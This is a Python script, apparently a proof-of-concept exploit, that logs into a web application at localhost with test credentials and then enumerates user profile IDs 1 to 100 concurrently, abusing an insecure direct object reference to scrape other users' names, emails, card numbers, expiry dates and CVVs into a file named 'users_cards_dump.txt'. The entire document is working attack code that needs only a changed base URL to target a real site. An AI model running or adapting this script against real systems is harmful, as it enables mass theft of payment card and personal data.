import asyncio
import aiohttp
from bs4 import BeautifulSoup

URL_BASE = "http://localhost:8000"
USERNAME = "test@example.com"
PASSWORD = "test"
sem = asyncio.Semaphore(100)

async def login(session):
    login_url = f"{URL_BASE}/login/"
    async with session.get(login_url) as resp:
        html = await resp.text()
        soup = BeautifulSoup(html, "html.parser")
        csrf = soup.find("input", {"name": "csrfmiddlewaretoken"}).get("value")

    payload = {
        "csrfmiddlewaretoken": csrf,
        "username": USERNAME,
        "password": PASSWORD,
    }

    headers = {
        "Referer": login_url,
    }

    async with session.post(login_url, data=payload, headers=headers) as resp:
        if resp.status not in [200, 302]:
            raise Exception(f"Login failed: {resp.status}")
        print("[+] Login successful.")

async def fetch_profile(session, user_id):
    async with sem:
        url = f"{URL_BASE}/profile/{user_id}"
        async with session.get(url) as resp:
            html = await resp.text()
            if resp.status == 200:
                return parse_profile(html, user_id)
            return f"[{user_id}] Erreur {resp.status}"

def parse_profile(html, user_id):
    soup = BeautifulSoup(html, "html.parser")

    # Bank data
    card_number = soup.find("input", {"name": "card_number"})
    card_expiry = soup.find("input", {"name": "card_expiry"})
    card_cvv = soup.find("input", {"name": "card_cvv"})

    # Personal data
    username = soup.find("input", {"name": "username"})
    email = soup.find("input", {"name": "email"})
    first_name = soup.find("input", {"name": "first_name"})
    last_name = soup.find("input", {"name": "last_name"})

    return f"[{user_id}] {first_name['value']} {last_name['value']} | {email['value']} | {username['value']} || CB: {card_number['value']} | Exp: {card_expiry['value']} | CVV: {card_cvv['value']}"

async def main():
    async with aiohttp.ClientSession() as session:
        await login(session)
        tasks = [fetch_profile(session, uid) for uid in range(1, 101)]
        results = await asyncio.gather(*tasks)

        with open("users_cards_dump.txt", "w") as f:
            for line in results:
                f.write(line + "\n")

asyncio.run(main())
